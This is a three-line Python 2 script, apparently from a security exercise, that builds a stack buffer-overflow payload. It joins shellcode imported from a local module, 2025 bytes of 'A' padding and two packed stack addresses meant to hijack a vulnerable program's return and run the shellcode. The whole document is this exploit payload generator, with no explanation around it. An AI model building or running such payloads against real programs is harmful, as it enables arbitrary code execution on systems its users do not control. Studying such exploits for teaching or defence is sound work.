from shellcode import shellcode
from struct import pack
print shellcode + 'A'*2025 + pack("<I",0xBFFE78e8) + pack("<I",0xbffe80fc)
# 